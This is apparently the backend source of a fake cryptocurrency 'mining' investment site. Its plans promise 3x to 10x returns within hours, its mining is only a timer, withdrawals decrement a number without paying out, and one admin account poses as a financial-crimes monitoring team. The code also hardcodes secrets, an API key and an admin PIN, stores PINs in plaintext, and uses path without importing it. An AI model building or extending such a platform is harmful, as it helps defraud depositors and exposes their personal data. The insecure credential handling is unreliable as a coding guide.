const express = require('express');
const multer = require('multer');
const cors = require('cors');
const jwt = require('jsonwebtoken');

const app = express();

// ── Configuration ───────────────────────────────────────
const PORT = process.env.PORT || 1000;
const SECRET = 'bitvault_mining_secret_2026';

// jsonbin.io – using the new credentials you provided
const JSONBIN_API_KEY = '$2a$10$GUq2LJUeEB/YG2Y6tzfllejaUsuj1xeqbS4CYXfmWCwJqIdfc04gG';   // Access key
const JSONBIN_BIN_ID = '69fa771a36566621a82c8cd8';
const JSONBIN_URL = `https://api.jsonbin.io/v3/b/${JSONBIN_BIN_ID}`;
const JSONBIN_HEADERS = {
  'X-Access-Key': JSONBIN_API_KEY,
  'Content-Type': 'application/json'
};

// Admin accounts (both use the same PIN)
const ADMINS = [
  { email: 'paymentbitcoin91@gmail.com', pin: '338989' },
  { email: 'efcctransactionsmonitoringteam@gmail.com', pin: '338989' }
];

// ── Middleware ──────────────────────────────────────────
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));
const upload = multer({ storage: multer.memoryStorage() });

// ── In‑memory database (loaded from bin) ────────────────
let db = { users: [], transactions: [], plans: [], notifications: [], deposits: [] };

// ── Helpers ─────────────────────────────────────────────
async function loadDataFromBin() {
  try {
    const res = await fetch(`${JSONBIN_URL}/latest`, {
      headers: { 'X-Access-Key': JSONBIN_API_KEY }
    });
    if (!res.ok) {
      console.warn(`⚠️ Bin fetch failed (${res.status}). Using empty data.`);
      return db;
    }
    const json = await res.json();
    return json.record || db;
  } catch (err) {
    console.warn('⚠️ Could not reach jsonbin, using local data.');
    return db;
  }
}

async function saveDataToBin() {
  try {
    await fetch(JSONBIN_URL, {
      method: 'PUT',
      headers: JSONBIN_HEADERS,
      body: JSON.stringify(db)
    });
  } catch (err) {
    // silently continue – data stays in memory
  }
}

function recordTransaction(userId, type, amount, status, details) {
  db.transactions.push({ userId, date: new Date().toISOString(), type, amount, status, details });
  saveDataToBin();
}

// ── Auth middleware ─────────────────────────────────────
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  if (!token) return res.status(401).json({ success: false, message: 'No token provided.' });
  jwt.verify(token, SECRET, (err, user) => {
    if (err) return res.status(403).json({ success: false, message: 'Invalid token.' });
    req.user = user;
    next();
  });
}

function adminOnly(req, res, next) {
  const admin = db.users.find(u => u.id === req.user.id && u.isAdmin);
  if (!admin) return res.status(403).json({ success: false, message: 'Admin access required.' });
  next();
}

// ── Seed admin accounts ─────────────────────────────────
function seedAdmins() {
  ADMINS.forEach(({ email, pin }) => {
    if (!db.users.find(u => u.email === email)) {
      db.users.push({
        id: 'admin_' + Date.now() + Math.random().toString(36).substr(2, 5),
        fullName: 'Administrator',
        email,
        phone: '',
        alias: 'admin',
        address: {},
        profilePic: null,
        pin,
        availableBalance: 0,
        withdrawableBalance: 0,
        isAdmin: true,
        isActive: true,
        createdAt: new Date().toISOString()
      });
    }
  });
  saveDataToBin();
  console.log('✅ Admin accounts ready');
}

// ===================== USER REGISTRATION & LOGIN =====================
app.post('/api/register', upload.single('profilePic'), async (req, res) => {
  const { fullName, phone, email, country, region, city, street, pin, alias } = req.body;
  if (!fullName || !phone || !email || !pin || pin.length !== 6) {
    return res.status(400).json({ success: false, message: 'Missing fields or PIN not 6 digits.' });
  }
  if (db.users.find(u => u.email === email || u.phone === phone)) {
    return res.status(400).json({ success: false, message: 'Email or phone already registered.' });
  }

  let profilePic = null;
  if (req.file) {
    const mime = req.file.mimetype;
    const base64 = req.file.buffer.toString('base64');
    profilePic = `data:${mime};base64,${base64}`;
  }

  const newUser = {
    id: Date.now().toString(36) + Math.random().toString(36).substr(2, 5),
    fullName, phone, email, alias: alias || '',
    address: { country, region, city, street: street || '' },
    profilePic,
    pin,
    availableBalance: 0,
    withdrawableBalance: 0,
    isAdmin: false,
    isActive: true,
    createdAt: new Date().toISOString()
  };

  db.users.push(newUser);
  await saveDataToBin();

  const token = jwt.sign({ id: newUser.id, email: newUser.email }, SECRET, { expiresIn: '7d' });
  const { pin: _, ...safeUser } = newUser;
  res.status(201).json({ success: true, token, user: safeUser });
});

app.post('/api/login', async (req, res) => {
  const { login, pin } = req.body;
  const user = db.users.find(u => (u.email === login || u.phone === login) && u.pin === pin);
  if (!user) return res.json({ success: false, message: 'Invalid credentials.' });
  if (!user.isActive) return res.json({ success: false, message: 'Account is deactivated.' });
  const token = jwt.sign({ id: user.id, email: user.email }, SECRET, { expiresIn: '7d' });
  const { pin: _, ...safeUser } = user;
  res.json({ success: true, token, user: safeUser });
});

// ===================== USER PROFILE =====================
app.get('/api/user', authenticateToken, (req, res) => {
  const user = db.users.find(u => u.id === req.user.id);
  if (!user) return res.status(404).json({ success: false, message: 'User not found.' });
  const { pin, ...safe } = user;
  res.json(safe);
});

app.patch('/api/user', authenticateToken, async (req, res) => {
  const idx = db.users.findIndex(u => u.id === req.user.id);
  if (idx === -1) return res.status(404).json({ success: false, message: 'User not found.' });
  const { alias, fullName, email, phone, address } = req.body;
  if (alias !== undefined) db.users[idx].alias = alias;
  if (fullName) db.users[idx].fullName = fullName;
  if (email) db.users[idx].email = email;
  if (phone) db.users[idx].phone = phone;
  if (address) db.users[idx].address = { ...db.users[idx].address, ...address };
  await saveDataToBin();
  res.json({ success: true });
});

app.put('/api/user/pin', authenticateToken, async (req, res) => {
  const { oldPin, newPin } = req.body;
  const idx = db.users.findIndex(u => u.id === req.user.id);
  if (idx === -1) return res.json({ success: false, message: 'User not found.' });
  if (db.users[idx].pin !== oldPin) return res.json({ success: false, message: 'Current PIN incorrect.' });
  if (newPin.length !== 6) return res.json({ success: false, message: 'PIN must be 6 digits.' });
  db.users[idx].pin = newPin;
  await saveDataToBin();
  res.json({ success: true });
});

app.post('/api/user/photo', authenticateToken, upload.single('profilePic'), async (req, res) => {
  if (!req.file) return res.status(400).json({ success: false, message: 'No file.' });
  const idx = db.users.findIndex(u => u.id === req.user.id);
  if (idx === -1) return res.json({ success: false, message: 'User not found.' });
  const mime = req.file.mimetype;
  const base64 = req.file.buffer.toString('base64');
  db.users[idx].profilePic = `data:${mime};base64,${base64}`;
  await saveDataToBin();
  res.json({ success: true, profilePic: db.users[idx].profilePic });
});

// ===================== DEPOSIT =====================
app.post('/api/deposit/pending', authenticateToken, async (req, res) => {
  const { amount, walletAddress } = req.body;
  if (!amount || amount <= 0) return res.json({ success: false, message: 'Invalid amount.' });
  const deposit = {
    id: 'dep_' + Date.now(),
    userId: req.user.id,
    amount: parseFloat(amount),
    walletAddress: walletAddress || '',
    status: 'pending',
    receiptUrl: null,
    createdAt: new Date().toISOString()
  };
  db.deposits.push(deposit);
  await saveDataToBin();
  res.json({ success: true, depositId: deposit.id });
});

app.post('/api/deposit/receipt', authenticateToken, upload.single('receipt'), async (req, res) => {
  const { depositId } = req.body;
  if (!req.file) return res.status(400).json({ success: false, message: 'No file.' });
  const deposit = db.deposits.find(d => d.id === depositId && d.userId === req.user.id);
  if (!deposit) return res.json({ success: false, message: 'Deposit not found.' });
  const mime = req.file.mimetype;
  const base64 = req.file.buffer.toString('base64');
  deposit.receiptUrl = `data:${mime};base64,${base64}`;
  await saveDataToBin();
  res.json({ success: true, receiptUrl: deposit.receiptUrl });
});

app.get('/api/deposit/status/:id', authenticateToken, (req, res) => {
  const deposit = db.deposits.find(d => d.id === req.params.id && d.userId === req.user.id);
  if (!deposit) return res.json({ success: false, message: 'Deposit not found.' });
  res.json({ success: true, status: deposit.status });
});

// ===================== MINING =====================
function startMining(userId, amount, plan, res) {
  const user = db.users.find(u => u.id === userId);
  if (!user) return res.json({ success: false, message: 'User not found.' });

  const planConfig = {
    '45min':  { min: 200,   multiplier: 3,  durationMs: 45 * 60 * 1000, name: 'Starter Miner' },
    '90min':  { min: 1000,  multiplier: 5,  durationMs: 90 * 60 * 1000, name: 'Advanced Miner' },
    '120min': { min: 5000,  multiplier: 7,  durationMs: 120 * 60 * 1000, name: 'Professional Miner' },
    '180min': { min: 50000, multiplier: 10, durationMs: 180 * 60 * 1000, name: 'Whale Miner' }
  };

  const cfg = planConfig[plan];
  if (!cfg) return res.json({ success: false, message: 'Invalid plan.' });

  if (amount < cfg.min || amount > user.availableBalance) {
    return res.json({ success: false, message: `Insufficient available balance. Min $${cfg.min}, available $${user.availableBalance}.` });
  }

  const expectedReturn = amount * cfg.multiplier;
  user.availableBalance -= amount;
  saveDataToBin();

  const planId = 'plan_' + Date.now();
  db.plans.push({
    planId, userId,
    planName: cfg.name,
    amount, multiplier: cfg.multiplier, expectedReturn,
    durationMs: cfg.durationMs,
    startTime: Date.now(),
    completed: false,
    claimed: false
  });
  saveDataToBin();
  recordTransaction(userId, 'Mining Start', -amount, 'pending', `${plan} plan`);
  setTimeout(() => completePlan(planId), cfg.durationMs);
  res.json({ success: true, expectedReturn, planId });
}

function completePlan(planId) {
  const plan = db.plans.find(p => p.planId === planId);
  if (!plan || plan.completed) return;
  plan.completed = true;
  saveDataToBin();
}

app.post('/api/mining/start', authenticateToken, (req, res) => startMining(req.user.id, req.body.amount, req.body.plan, res));
app.post('/api/plan/upgrade', authenticateToken, (req, res) => startMining(req.user.id, req.body.amount, req.body.plan, res));

app.post('/api/plan/claim/:planId', authenticateToken, async (req, res) => {
  const plan = db.plans.find(p => p.planId === req.params.planId && p.userId === req.user.id);
  if (!plan) return res.json({ success: false, message: 'Plan not found.' });
  if (!plan.completed) return res.json({ success: false, message: 'Plan not yet completed.' });
  if (plan.claimed) return res.json({ success: false, message: 'Already claimed.' });
  plan.claimed = true;
  const user = db.users.find(u => u.id === req.user.id);
  if (user) user.withdrawableBalance += plan.expectedReturn;
  await saveDataToBin();
  recordTransaction(req.user.id, 'Mining Complete', plan.expectedReturn, 'completed', `${plan.planName} | ${plan.multiplier}x`);
  res.json({ success: true, withdrawableBalance: user?.withdrawableBalance });
});

app.get('/api/mining/active', authenticateToken, (req, res) => {
  const plans = db.plans.filter(p => p.userId === req.user.id && !p.claimed);
  res.json(plans);
});

// ===================== WITHDRAW =====================
app.post('/api/withdraw', authenticateToken, async (req, res) => {
  const { amount, method } = req.body;
  const idx = db.users.findIndex(u => u.id === req.user.id);
  if (idx === -1) return res.json({ success: false, message: 'User not found.' });
  if (amount <= 0 || amount > db.users[idx].withdrawableBalance) {
    return res.json({ success: false, message: 'Invalid amount or insufficient withdrawable balance.' });
  }
  db.users[idx].withdrawableBalance -= amount;
  await saveDataToBin();
  recordTransaction(req.user.id, 'Withdrawal', -amount, 'completed', method === 'bank' ? 'Bank Transfer' : 'Crypto Wallet');
  res.json({ success: true, withdrawableBalance: db.users[idx].withdrawableBalance });
});

// ===================== TRANSACTIONS =====================
app.get('/api/transactions', authenticateToken, (req, res) => {
  const userTx = db.transactions.filter(tx => tx.userId === req.user.id).reverse();
  res.json({ transactions: userTx });
});

// ===================== ADMIN ROUTES =====================
app.post('/api/admin/login', (req, res) => {
  const { email, pin } = req.body;
  const adminAccount = ADMINS.find(a => a.email === email && a.pin === pin);
  if (!adminAccount) return res.json({ success: false, message: 'Invalid admin credentials.' });
  const admin = db.users.find(u => u.email === email && u.isAdmin);
  if (!admin) return res.json({ success: false, message: 'Admin not found.' });
  const token = jwt.sign({ id: admin.id, email: admin.email }, SECRET, { expiresIn: '1d' });
  res.json({ success: true, token });
});

app.get('/api/admin/users', authenticateToken, adminOnly, (req, res) => {
  const safeUsers = db.users.map(({ pin, ...rest }) => rest);
  res.json({ success: true, users: safeUsers });
});

app.post('/api/admin/credit', authenticateToken, adminOnly, async (req, res) => {
  const { userId, amount } = req.body;
  if (!userId || !amount || amount <= 0) return res.json({ success: false, message: 'Invalid data.' });
  const idx = db.users.findIndex(u => u.id === userId);
  if (idx === -1) return res.json({ success: false, message: 'User not found.' });
  db.users[idx].availableBalance += parseFloat(amount);
  await saveDataToBin();
  recordTransaction(userId, 'Admin Credit', amount, 'completed', 'Admin adjustment');
  res.json({ success: true });
});

app.put('/api/admin/user/status', authenticateToken, adminOnly, async (req, res) => {
  const { userId, isActive } = req.body;
  const user = db.users.find(u => u.id === userId);
  if (!user) return res.json({ success: false, message: 'User not found.' });
  user.isActive = !!isActive;
  await saveDataToBin();
  res.json({ success: true });
});

app.put('/api/admin/user/pin', authenticateToken, adminOnly, async (req, res) => {
  const { userId, newPin } = req.body;
  if (!newPin || newPin.length !== 6) return res.json({ success: false, message: 'Invalid PIN.' });
  const user = db.users.find(u => u.id === userId);
  if (!user) return res.json({ success: false, message: 'User not found.' });
  user.pin = newPin;
  await saveDataToBin();
  res.json({ success: true });
});

app.get('/api/admin/deposits/pending', authenticateToken, adminOnly, (req, res) => {
  const pending = db.deposits.filter(d => d.status === 'pending');
  const enriched = pending.map(d => ({
    ...d,
    userName: (db.users.find(u => u.id === d.userId) || {}).fullName || 'Unknown'
  }));
  res.json({ deposits: enriched });
});

app.post('/api/admin/deposit/approve/:id', authenticateToken, adminOnly, async (req, res) => {
  const deposit = db.deposits.find(d => d.id === req.params.id);
  if (!deposit) return res.json({ success: false, message: 'Deposit not found.' });
  if (deposit.status !== 'pending') return res.json({ success: false, message: 'Already processed.' });
  deposit.status = 'completed';
  const user = db.users.find(u => u.id === deposit.userId);
  if (user) user.availableBalance += deposit.amount;
  await saveDataToBin();
  recordTransaction(deposit.userId, 'Deposit Approved', deposit.amount, 'completed', 'Admin approval');
  res.json({ success: true });
});

app.post('/api/admin/deposit/cancel/:id', authenticateToken, adminOnly, async (req, res) => {
  const deposit = db.deposits.find(d => d.id === req.params.id);
  if (!deposit) return res.json({ success: false, message: 'Deposit not found.' });
  deposit.status = 'cancelled';
  await saveDataToBin();
  res.json({ success: true });
});

app.post('/api/admin/notify', authenticateToken, adminOnly, async (req, res) => {
  const { userId, message } = req.body;
  if (!message) return res.json({ success: false, message: 'Message required.' });
  db.notifications.push({
    id: Date.now(),
    targetUserId: userId || 'all',
    message,
    date: new Date().toISOString()
  });
  await saveDataToBin();
  res.json({ success: true, message: 'Notification sent.' });
});

// ===================== SERVE HTML =====================
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/register', (req, res) => res.sendFile(path.join(__dirname, 'public', 'register.html')));
app.get('/login', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
app.get('/deposit', (req, res) => res.sendFile(path.join(__dirname, 'public', 'deposit.html')));
app.get('/mining', (req, res) => res.sendFile(path.join(__dirname, 'public', 'mining.html')));
app.get('/history', (req, res) => res.sendFile(path.join(__dirname, 'public', 'history.html')));
app.get('/withdraw', (req, res) => res.sendFile(path.join(__dirname, 'public', 'withdraw.html')));
app.get('/profile', (req, res) => res.sendFile(path.join(__dirname, 'public', 'profile.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

// ── Start ───────────────────────────────────────────────
async function init() {
  db = await loadDataFromBin();
  seedAdmins();
  app.listen(PORT, () => {
    console.log(`⛏️  Bitcoin miner running on port ${PORT}`);
    console.log(`🛡️  Admins: paymentbitcoin91@gmail.com / efcctransactionsmonitoringteam@gmail.com`);
  });
}
init();
